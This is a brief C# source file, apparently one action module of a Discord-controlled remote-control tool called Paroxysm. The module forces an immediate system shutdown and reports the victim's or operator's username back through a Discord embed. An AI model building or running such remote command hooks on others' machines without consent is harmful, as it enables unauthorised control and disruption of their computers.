using System.Diagnostics;
using Discord;
using Paroxysm.Discord;

namespace Paroxysm.Hooks.Actions;

public static class ShutdownAction
{
    public static Embed Follow()
    {
        Process.Start("shutdown", "/s /t 0");

        return DiscordEmbed.CreateWithText(Color.Green, "Command was successfully executed",
            "Computer has been offed.", Environment.UserName, null);
    }
}